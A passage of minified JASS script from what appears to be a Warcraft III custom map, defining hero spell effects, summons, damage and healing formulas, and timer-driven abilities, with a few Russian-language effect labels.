set NQ=CreateUnitAtLoc(Player(Ma),$6E303647,Nk,0)
call nD(NQ,8)
call IssueTargetOrder(NQ,"attack",Nv)
call RemoveLocation(Nk)
set Nk=null
set NQ=null
elseif GetSpellAbilityId()==$41305747 then
set Nk=GetUnitLoc(Nv)
set NQ=CreateUnitAtLoc(Player(Ma),$6E303647,Nk,0)
if nO(Hu,$49305A44) or nO(Hu,$49305A35) then
call UnitAddAbility(NQ,$41303256)
endif
call nD(NQ,8)
call IssueTargetOrder(NQ,"attack",Nv)
call RemoveLocation(Nk)
set Nk=null
set NQ=null
set Nk=GetUnitLoc(Nv)
set NQ=CreateUnitAtLoc(Player(Ma),$6E303647,Nk,0)
if nO(Hu,$49305A44) or nO(Hu,$49305A35) then
call UnitAddAbility(NQ,$41303256)
endif
call nD(NQ,8)
call IssueTargetOrder(NQ,"attack",Nv)
call RemoveLocation(Nk)
set Nk=null
set NQ=null
elseif GetSpellAbilityId()==$41313657 then
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)*.15)
set Nk=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(Player(Ma),$68303739,Nk,270)
call UnitAddAbility(NQ,$4131364D)
call AddSpecialEffectTarget("war3mapImported\\DarkHarvest.mdx",NQ,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call TimerStart(Hc,4+I2R(GetUnitAbilityLevel(Hu,$41313657)*2),false,function pR)
set Hc=null
elseif GetSpellAbilityId()==$41304253 then
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)*.2)
call UnitAddAbility(Hu,$41304C4E)
call UnitAddAbility(Nv,$41304C4E)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,GetSpellTargetUnit())
call SaveReal(Nq,GetHandleId(Hc),2,GetUnitState(Hu,UNIT_STATE_LIFE))
call SaveReal(Nq,GetHandleId(Hc),3,GetUnitState(Hu,UNIT_STATE_MANA))
call SaveLightningHandle(Nq,GetHandleId(Hc),4,AddLightningEx("SPRL",true,GetUnitX(Hu),GetUnitY(Hu),50,GetUnitX(GetSpellTargetUnit()),GetUnitY(GetSpellTargetUnit()),50))
call SaveInteger(Nq,GetHandleId(Hc),5,121)
call SaveEffectHandle(Nq,GetHandleId(Hc),6,AddSpecialEffectTarget("war3mapImported\\ShadowyMissileofEvilDOOMV2.mdx",GetSpellTargetUnit(),"chest"))
call SaveEffectHandle(Nq,GetHandleId(Hc),7,AddSpecialEffectTarget("war3mapImported\\Soul Aura.mdx",Hu,"origin"))
call TimerStart(Hc,.1,true,function pQ)
set Hc=null
elseif GetSpellAbilityId()==$41305759 then
call SetUnitInvulnerable(Hu,true)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call SaveInteger(Nq,GetHandleId(Hc),5,6)
call TimerStart(Hc,.5,true,function pP)
set Hc=null
elseif GetSpellAbilityId()==$41305850 then
set Nk=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(Player(Ma),$68303739,Nk,0)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call SaveInteger(Nq,GetHandleId(Hc),2,0)
call TimerStart(Hc,1,true,function oY)
call RemoveLocation(Nk)
set Nk=null
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
set Na=null
set NQ=null
set Nv=null
set Hc=null
endfunction
function pV takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function pU)
set Hc=null
endfunction
function pW takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())==$68303742 then
if GetUnitAbilityLevel(GetFilterUnit(),$41303853)==0 then
if GetOwningPlayer(GetFilterUnit())==GetOwningPlayer(GetTriggerUnit()) then
return true
endif
endif
endif
return false
endfunction
function pX takes nothing returns nothing
local unit Hu=GetEnumUnit()
call DestroyEffect(AddSpecialEffectTarget(V5,Hu,"origin"))
set Hu=null
endfunction
function pY takes nothing returns nothing
local location Ht=GetUnitLoc(GetSpellTargetUnit())
call SetUnitPositionLoc(GetEnumUnit(),Ht)
call IssueTargetOrder(GetEnumUnit(),"attack",GetSpellTargetUnit())
call RemoveLocation(Ht)
set Ht=null
endfunction
function pZ takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(Hu)
local unit NQ=CreateUnitAtLoc(GetOwningPlayer(Pq),$68303742,Ht,0)
local integer Ma
local integer L9
local real UV
local real V6
call nD(NQ,4+2*GetUnitAbilityLevel(Pq,$41314352))
set Ma=GetPlayerId(GetOwningPlayer(Pq))+1
set L9=(GetHeroStr(Pq,true)+GetHeroAgi(Pq,true)+GetHeroInt(Pq,true))/3
set UV=(TQ[Ma]+N0[Ma]+Nd[Ma]+Ng[Ma]+Nf[Ma])/5
set V6=I2R(L9)*UV+I2R(100*GetUnitAbilityLevel(Pq,$41314354))
if GetUnitAbilityLevel(Pq,$41314130)>=1 then
call nj(NQ,R2I(V6*1.5))
elseif GetUnitAbilityLevel(Pq,$41314131)>=1 then
call nj(NQ,R2I(V6))
call UnitAddAbility(NQ,$41304639)
elseif GetUnitAbilityLevel(Pq,$41314132)>=1 then
call nj(NQ,R2I(V6))
call UnitAddAbility(NQ,$41305341)
endif
call IssueTargetOrder(NQ,"atack",Hu)
call RemoveLocation(Ht)
set Ht=null
set Hu=null
set NQ=null
endfunction
function pa takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(Hu)
local group V9=CreateGroup()
local boolexpr Nb=Condition(function mx)
call GroupEnumUnitsInRange(V9,GetLocationX(Ht),GetLocationY(Ht),200,Nb)
call ForGroup(V9,function nB)
call DestroyGroup(V9)
call DestroyBoolExpr(Nb)
set V9=null
set Nb=null
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Other\\Levelup\\LevelupCaster.mdl",Ht))
call RemoveLocation(Ht)
set Hu=null
set Ht=null
endfunction
function pb takes nothing returns nothing
if IsUnitInGroup(GetEnumUnit(),UN[GetPlayerId(GetOwningPlayer(Pq))])==false then
call GroupAddUnit(UN[GetPlayerId(GetOwningPlayer(Pq))],GetEnumUnit())
call mz(Pq,GetEnumUnit(),Nu)
endif
endfunction
function pc takes nothing returns nothing
local unit Nv=GetEnumUnit()
local location Ht
local unit NQ
call DestroyEffect(AddSpecialEffectTarget(V5,Nv,"overhead"))
set Ht=GetUnitLoc(Nv)
call mz(Pq,Nv,Nu)
set NQ=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call nD(NQ,1)
call UnitAddAbility(NQ,$4131324E)
call UnitApplyTimedLife(NQ,$42544C46,1)
call IssueTargetOrder(NQ,"creepthunderbolt",Nv)
call RemoveLocation(Ht)
set NQ=null
set Nv=null
set Ht=null
endfunction
function pd takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),7)
local integer Mc
local real No
local real Np
local location Nt
local string Ny
local location Ot
local group Ou
local boolexpr Ov
local integer Ow
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)==70 then
call GroupClear(UN[GetPlayerId(GetOwningPlayer(Hu))])
endif
set Pq=Hu
set Mc=GetPlayerId(GetOwningPlayer(Hu))+1
set No=.8*I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))
set Np=(TQ[Mc]+N0[Mc]+Nd[Mc]+Ng[Mc]+Nf[Mc])/5
set Nu=R2I(No*Np)+200*GetUnitAbilityLevel(Hu,$41314355)
set Nt=GetUnitLoc(NQ)
set Ny=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Ny="Abilities\\Spells\\Human\\HolyBolt\\HolyBoltSpecialArt.mdl"
endif
call DestroyEffect(AddSpecialEffectLoc(Ny,Nt))
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=70 then
set Ot=PolarProjectionBJ(Nt,10,GetUnitFacing(NQ))
call SetUnitPositionLoc(NQ,Ot)
else
set Ot=PolarProjectionBJ(Nt,-10,GetUnitFacing(NQ))
call SetUnitPositionLoc(NQ,Ot)
endif
set Ou=CreateGroup()
set Ov=Condition(function mx)
call GroupEnumUnitsInRange(Ou,GetLocationX(Nt),GetLocationY(Nt),200,Ov)
call ForGroup(Ou,function pb)
call DestroyGroup(Ou)
call DestroyBoolExpr(Ov)
set Ou=null
set Ov=null
call RemoveLocation(Nt)
call RemoveLocation(Ot)
set Nt=null
set Ot=null
else
call KillUnit(NQ)
call RemoveUnit(NQ)
set Pq=Hu
set Mc=GetPlayerId(GetOwningPlayer(Hu))+1
set No=.5*I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))
set Np=(TQ[Mc]+N0[Mc]+Nd[Mc]+Ng[Mc]+Nf[Mc])/5
set Nu=R2I(No*Np)+200*GetUnitAbilityLevel(Hu,$41314355)
set Ou=CreateGroup()
set Ov=Condition(function pW)
call GroupEnumUnitsOfPlayer(Ou,GetOwningPlayer(Hu),Ov)
set Ow=CountUnitsInGroup(Ou)
if Ow>=1 then
call ForGroup(Ou,function pa)
endif
call DestroyBoolExpr(Ov)
set Ov=null
call DestroyGroup(Ou)
set Ou=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function pe takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),2)
local location Ht=LoadLocationHandle(PP,GetHandleId(GetExpiredTimer()),5)
local unit Mc
local integer No
local integer Np
local real Nt
local real Ny
local group Ot
local boolexpr Ou
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303742,Ht,0)
set No=GetPlayerId(GetOwningPlayer(Hu))+1
set Np=(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/3
set Nt=(TQ[No]+N0[No]+Nd[No]+Ng[No]+Nf[No])/5
set Ny=I2R(Np)*Nt+I2R(100*GetUnitAbilityLevel(Hu,$41314354))
call nj(Mc,R2I(Ny*1.5))
set Ot=CreateGroup()
if GetUnitAbilityLevel(Hu,$41314130)>=1 then
call nD(Mc,1.5)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Smite.mdx",Ht))
set Ou=Condition(function mx)
call GroupEnumUnitsInRange(Ot,GetLocationX(Ht),GetLocationY(Ht),300,Ou)
set Pq=Hu
set Nu=Np*R2I(Nt)+500*GetUnitAbilityLevel(Hu,$41314353)
call ForGroup(Ot,function nB)
elseif GetUnitAbilityLevel(Hu,$41314131)>=1 then
call nD(Mc,1.5)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Smite Green.mdx",Ht))
set Ou=Condition(function mw)
call GroupEnumUnitsInRange(Ot,GetLocationX(Ht),GetLocationY(Ht),300,Ou)
set Nu=Np/2*R2I(Nt)+500*GetUnitAbilityLevel(Hu,$41314353)
call ForGroup(Ot,function m4)
elseif GetUnitAbilityLevel(Hu,$41314132)>=1 then
call nD(Mc,3)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Smite.mdx",Ht))
set Ou=Condition(function mx)
call GroupEnumUnitsInRange(Ot,GetLocationX(Ht),GetLocationY(Ht),300,Ou)
endif
call DestroyGroup(Ot)
set Ot=null
call DestroyBoolExpr(Ou)
set Ou=null
set Mc=null
else
call RemoveLocation(Ht)
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(GetExpiredTimer()),6))
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),6)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),5)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Ht=null
set Hu=null
endfunction
function pf takes nothing returns nothing
local group Na=LoadGroupHandle(PP,GetHandleId(GetExpiredTimer()),0)
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),2)
local group Mc
local boolexpr No
local integer Np
local integer Nt
local real Ny
local real Ot
local real Ou
local real Ov
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)!=0 then
set Pq=Hu
set Mc=CreateGroup()
set No=Condition(function pW)
call GroupEnumUnitsOfPlayer(Mc,GetOwningPlayer(Hu),No)
set Np=CountUnitsInGroup(Mc)
call DestroyBoolExpr(No)
call DestroyGroup(Mc)
set No=null
set Mc=null
set Nt=GetPlayerId(GetOwningPlayer(Hu))+1
set Ny=I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))*.4
set Ot=(TQ[Nt]+N0[Nt]+Nd[Nt]+Ng[Nt]+Nf[Nt])/5
set Ou=(Ny+I2R(100*GetUnitAbilityLevel(Hu,$41314242)))*Ot
set Ov=Ou*(1+Np*.05)
set Nu=R2I(Ov)
set V5="war3mapImported\\Heal Orange.mdx"
call ForGroup(Na,function pc)
call ForGroup(Na,function pX)
else
call DestroyGroup(Na)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Na=null
set Hu=null
endfunction
function pg takes nothing returns nothing
local group Na=LoadGroupHandle(PP,GetHandleId(GetExpiredTimer()),0)
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),2)
local group Mc
local boolexpr No
local integer Np
local integer Nt
local real Ny
local real Ot
local real Ou
local real Ov
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)!=0 then
set Pq=Hu
set Mc=CreateGroup()
set No=Condition(function pW)
call GroupEnumUnitsOfPlayer(Mc,GetOwningPlayer(Hu),No)
set Np=CountUnitsInGroup(Mc)
call DestroyBoolExpr(No)
call DestroyGroup(Mc)
set No=null
set Mc=null
set Nt=GetPlayerId(GetOwningPlayer(Hu))+1
set Ny=I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))*.1
set Ot=(TQ[Nt]+N0[Nt]+Nd[Nt]+Ng[Nt]+Nf[Nt])/5
set Ou=(Ny+I2R(100*GetUnitAbilityLevel(Hu,$41314242)))*Ot
set Ov=Ou*(1+Np*.05)
set Nu=R2I(Ov)
set V5="war3mapImported\\Heal Green.mdx"
call ForGroup(Na,function m4)
call ForGroup(Na,function pX)
else
call DestroyGroup(Na)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Na=null
set Hu=null
endfunction
function ph takes nothing returns nothing
local group Na=LoadGroupHandle(PP,GetHandleId(GetExpiredTimer()),0)
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),2)
local group Mc
local boolexpr No
local integer Np
local integer Nt
local real Ny
local real Ot
local real Ou
local real Ov
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)>=1 then
set Pq=Hu
set Mc=CreateGroup()
set No=Condition(function pW)
call GroupEnumUnitsOfPlayer(Mc,GetOwningPlayer(Hu),No)
set Np=CountUnitsInGroup(Mc)
call DestroyBoolExpr(No)
call DestroyGroup(Mc)
set No=null
set Mc=null
set Nt=GetPlayerId(GetOwningPlayer(Hu))+1
set Ny=I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))*.4
set Ot=(TQ[Nt]+N0[Nt]+Nd[Nt]+Ng[Nt]+Nf[Nt])/5
set Ou=(Ny+I2R(135*GetUnitAbilityLevel(Hu,$41314242)))*Ot
set Ov=Ou*(1+Np*.05)
set Nu=R2I(Ov)
set V5="war3mapImported\\Heal Orange.mdx"
call ForGroup(Na,function nB)
call ForGroup(Na,function pX)
else
call DestroyGroup(Na)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Na=null
set Hu=null
endfunction
function pi takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht
local unit NQ
call DestroyEffect(AddSpecialEffectTarget(V5,Hu,"overhead"))
set Ht=GetUnitLoc(Hu)
set NQ=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call UnitAddAbility(NQ,$4131324E)
call UnitApplyTimedLife(NQ,$42544C46,1)
call IssueTargetOrder(NQ,"creepthunderbolt",Hu)
call RemoveLocation(Ht)
call mz(Pq,Hu,Nu)
set Ht=null
set Hu=null
call nD(NQ,1)
set NQ=null
endfunction
function pj takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Ht
local unit Mc
local unit No
local integer Np
local real Nt
local real Ny
local real Ot
local group Ou
local boolexpr Ov
local integer Ow
local group Ox
local boolexpr Oz
local timer O0
local string O1
local location V7
local effect V8
if GetSpellAbilityId()==$41313530 then
if GetUnitAbilityLevel(Hu,$41314130)==1 then
call UnitRemoveAbility(Hu,$41314130)
call UnitAddAbility(Hu,$41314131)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41314131,false)
call DestroyEffect(V4[GetPlayerId(GetOwningPlayer(Hu))])
set V4[GetPlayerId(GetOwningPlayer(Hu))]=AddSpecialEffectTarget("war3mapImported\\GreenPentagram (1).mdx",Hu,"origin")
call ne(Hu,"Зеленая пентаграмма",.023,0,255,0)
elseif GetUnitAbilityLevel(Hu,$41314131)==1 then
call UnitRemoveAbility(Hu,$41314131)
call UnitAddAbility(Hu,$41314132)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41314132,false)
call DestroyEffect(V4[GetPlayerId(GetOwningPlayer(Hu))])
set V4[GetPlayerId(GetOwningPlayer(Hu))]=AddSpecialEffectTarget("war3mapImported\\MagicCircle_Arcane.mdx",Hu,"origin")
call ne(Hu,"Синяя пентаграмма",.023,0,100,255)
elseif GetUnitAbilityLevel(Hu,$41314132)==1 then
call UnitRemoveAbility(Hu,$41314132)
call UnitAddAbility(Hu,$41314130)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41314130,false)
call DestroyEffect(V4[GetPlayerId(GetOwningPlayer(Hu))])
set V4[GetPlayerId(GetOwningPlayer(Hu))]=AddSpecialEffectTarget("war3mapImported\\MagicCircle_Fire.mdx",Hu,"origin")
call ne(Hu,"Красная пентаграмма",.023,255,0,0)
else
call UnitAddAbility(Hu,$41314130)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41314130,false)
call DestroyEffect(V4[GetPlayerId(GetOwningPlayer(Hu))])
set V4[GetPlayerId(GetOwningPlayer(Hu))]=AddSpecialEffectTarget("war3mapImported\\MagicCircle_Fire.mdx",Hu,"origin")
endif
endif
if GetSpellAbilityId()==$41314241 then
set Mc=GetSpellTargetUnit()
set Ht=GetUnitLoc(Mc)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Holy Light Royal.mdx",Mc,"origin"))
if GetUnitAbilityLevel(Hu,$41314130)==1 then
set No=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call UnitAddAbility(No,$4131324E)
call UnitApplyTimedLife(No,$42544C46,1)
call IssueTargetOrder(No,"creepthunderbolt",Mc)
set Np=GetPlayerId(GetOwningPlayer(Hu))+1
set Nt=I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))*3.4
set Ny=(TQ[Np]+N0[Np]+Nd[Np]+Ng[Np]+Nf[Np])/5
set Ot=(Nt+I2R(150*GetUnitAbilityLevel(Hu,$41314241)))*Ny
call mz(Hu,Mc,R2I(Ot))
set Pq=Mc
set Ou=CreateGroup()
set Ov=Condition(function pW)
call GroupEnumUnitsOfPlayer(Ou,GetOwningPlayer(Hu),Ov)
call DestroyBoolExpr(Ov)
call ForGroup(Ou,function pY)
call DestroyGroup(Ou)
set Ov=null
set Ou=null
elseif GetUnitAbilityLevel(Hu,$41314131)==1 then
set No=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call UnitAddAbility(No,$4131324E)
call UnitApplyTimedLife(No,$42544C46,1)
call IssueTargetOrder(No,"creepthunderbolt",Mc)
set Np=GetPlayerId(GetOwningPlayer(Hu))+1
set Nt=I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))*2.
set Ny=(TQ[Np]+N0[Np]+Nd[Np]+Ng[Np]+Nf[Np])/5
set Ot=(Nt+I2R(150*GetUnitAbilityLevel(Hu,$41314241)))*Ny
call mz(Hu,Mc,R2I(Ot))
set Ou=CreateGroup()
set Ov=Condition(function mw)
call GroupEnumUnitsInRange(Ou,GetLocationX(Ht),GetLocationY(Ht),400,Ov)
call DestroyBoolExpr(Ov)
set Ow=R2I(Ot/3)
call ForGroup(Ou,function m4)
call DestroyGroup(Ou)
set Ov=null
set Ou=null
set Pq=Mc
set Ox=CreateGroup()
set Oz=Condition(function pW)
call GroupEnumUnitsOfPlayer(Ox,GetOwningPlayer(Hu),Oz)
call DestroyBoolExpr(Oz)
call ForGroup(Ox,function pY)
call DestroyGroup(Ox)
set Oz=null
set Ox=null
elseif GetUnitAbilityLevel(Hu,$41314132)==1 then
set Np=GetPlayerId(GetOwningPlayer(Hu))+1
set Nt=I2R(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))*2.
set Ny=(TQ[Np]+N0[Np]+Nd[Np]+Ng[Np]+Nf[Np])/5
set Ot=(Nt+I2R(150*GetUnitAbilityLevel(Hu,$41314241)))*Ny
set Ou=CreateGroup()
set Ov=Condition(function mx)
call GroupEnumUnitsInRange(Ou,GetLocationX(Ht),GetLocationY(Ht),400,Ov)
call DestroyBoolExpr(Ov)
set Nu=R2I(Ot)
set Pq=Hu
set V5="war3mapImported\\Holy Light Royal.mdx"
call ForGroup(Ou,function pi)
call DestroyGroup(Ou)
set Ov=null
set Ou=null
set Pq=Mc
set Ox=CreateGroup()
set Oz=Condition(function pW)
call GroupEnumUnitsOfPlayer(Ox,GetOwningPlayer(Hu),Oz)
call DestroyBoolExpr(Oz)
call ForGroup(Ox,function pY)
call DestroyGroup(Ox)
set Oz=null
set Ox=null
endif
set Mc=null
call RemoveLocation(Ht)
set Ht=null
endif
if GetSpellAbilityId()==$41314242 then
set Ht=GetSpellTargetLoc()
set Ou=CreateGroup()
if GetUnitAbilityLevel(Hu,$41314130)==1 then
set Ov=Condition(function mx)
call GroupEnumUnitsInRange(Ou,GetLocationX(Ht),GetLocationY(Ht),300,Ov)
set O0=CreateTimer()
call SaveGroupHandle(PP,GetHandleId(O0),0,Ou)
call SaveUnitHandle(PP,GetHandleId(O0),2,Hu)
call SaveInteger(PP,GetHandleId(O0),1,6)
call TimerStart(O0,1,true,function ph)
call DestroyBoolExpr(Ov)
set Ov=null
set O0=null
elseif GetUnitAbilityLevel(Hu,$41314131)==1 then
set Ov=Condition(function mw)
call GroupEnumUnitsInRange(Ou,GetLocationX(Ht),GetLocationY(Ht),300,Ov)
call DestroyBoolExpr(Ov)
set O0=CreateTimer()
call SaveGroupHandle(PP,GetHandleId(O0),0,Ou)
call SaveUnitHandle(PP,GetHandleId(O0),2,Hu)
call SaveInteger(PP,GetHandleId(O0),1,6)
call TimerStart(O0,1,true,function pg)
set Ov=null
set O0=null
elseif GetUnitAbilityLevel(Hu,$41314132)==1 then
set Ov=Condition(function mx)
call GroupEnumUnitsInRange(Ou,GetLocationX(Ht),GetLocationY(Ht),300,Ov)
call DestroyBoolExpr(Ov)
set O0=CreateTimer()
call SaveGroupHandle(PP,GetHandleId(O0),0,Ou)
call SaveUnitHandle(PP,GetHandleId(O0),2,Hu)
call SaveInteger(PP,GetHandleId(O0),1,4)
call TimerStart(O0,3,true,function pf)
set Ov=null
set O0=null
endif
set Ou=null
call RemoveLocation(Ht)
set Ht=null
endif
if GetSpellAbilityId()==$41314352 then
set Ht=GetUnitLoc(Hu)
set Ou=CreateGroup()
set Ov=Condition(function mx)
call GroupEnumUnitsInRange(Ou,GetLocationX(Ht),GetLocationY(Ht),800,Ov)
set Pq=Hu
set O1=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set O1="war3mapImported\\Shining Flare.mdx"
endif
call DestroyEffect(AddSpecialEffectTarget(O1,Hu,"origin"))
call ForGroup(Ou,function pZ)
call DestroyBoolExpr(Ov)
call DestroyGroup(Ou)
set Ov=null
set Ou=null
call RemoveLocation(Ht)
set Ht=null
endif
if GetSpellAbilityId()==$41314353 then
set V7=GetSpellTargetLoc()
set V8=AddSpecialEffectLoc("war3mapImported\\Providence Aura.mdx",V7)
set O0=CreateTimer()
call SaveInteger(PP,GetHandleId(O0),1,8)
call SaveLocationHandle(PP,GetHandleId(O0),5,V7)
call SaveUnitHandle(PP,GetHandleId(O0),2,Hu)
call SaveEffectHandle(PP,GetHandleId(O0),6,V8)
call TimerStart(O0,1,true,function pe)
set V8=null
set O0=null
endif
if GetSpellAbilityId()==$41314354 then
set Ht=GetUnitLoc(GetSpellTargetUnit())
set Mc=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303742,Ht,0)
call nD(Mc,7)
set Np=GetPlayerId(GetOwningPlayer(Hu))+1
set Ow=(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/3
set Nt=(TQ[Np]+N0[Np]+Nd[Np]+Ng[Np]+Nf[Np])/5
set Ny=I2R(Ow)*Nt+I2R(100*GetUnitAbilityLevel(Pq,$41314354))
if GetUnitAbilityLevel(Hu,$41314130)>=1 then
call nj(Mc,R2I(Ny*1.5))
elseif GetUnitAbilityLevel(Hu,$41314131)>=1 then
call nj(Mc,R2I(Ny))
call UnitAddAbility(Mc,$41304639)
elseif GetUnitAbilityLevel(Hu,$41314132)>=1 then
call nj(Mc,R2I(Ny))
call UnitAddAbility(Mc,$41305341)
endif
call IssueTargetOrder(Mc,"atack",GetSpellTargetUnit())
set Mc=null
call RemoveLocation(Ht)
set Ht=null
endif
if GetSpellAbilityId()==$41314355 then
set Ht=GetUnitLoc(Hu)
set Mc=CreateUnitAtLoc(GetOwningPlayer(GetTriggerUnit()),$68303742,Ht,GetUnitFacing(Hu))
call UnitAddAbility(Mc,$41303853)
call SetUnitPathing(Mc,true)
call PauseUnit(Mc,true)
call SetUnitVertexColor(Mc,0,0,0,255)
call GroupClear(UN[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set O0=CreateTimer()
call SaveInteger(Nq,GetHandleId(O0),1,140)
call SaveUnitHandle(Nq,GetHandleId(O0),2,Hu)
call SaveUnitHandle(Nq,GetHandleId(O0),7,Mc)
call TimerStart(O0,.01,true,function pd)
call RemoveLocation(Ht)
set Ht=null
endif
set Hu=null
call RemoveLocation(Ht)
set Ht=null
set V7=null
set O0=null
set No=null
set Mc=null
endfunction
function pk takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Mc
local group No
local boolexpr Np
local integer Nt
local integer Ny
local real Ot
local real Ou
local real Ov
if GetUnitTypeId(Hu)==$68303742 then
if GetUnitAbilityLevel(Hu,$41303853)==0 then
set Mc=GetUnitLoc(Hu)
set No=CreateGroup()
set Nt=GetPlayerId(GetOwningPlayer(Hu))+1
set Ny=GetHeroStr(MT[GetPlayerId(GetOwningPlayer(Hu))],true)+GetHeroAgi(MT[GetPlayerId(GetOwningPlayer(Hu))],true)+GetHeroInt(MT[GetPlayerId(GetOwningPlayer(Hu))],true)
set Ot=(TQ[Nt]+N0[Nt]+Nd[Nt]+Ng[Nt]+Nf[Nt])/5
if nO(MT[GetPlayerId(GetOwningPlayer(Hu))],$49305A4D) then
set Ov=I2R(Ny)*.25
set Ou=Ov*Ot
elseif nO(MT[GetPlayerId(GetOwningPlayer(Hu))],$49305A4E) then
set Ov=I2R(Ny)*.3
set Ou=Ov*Ot
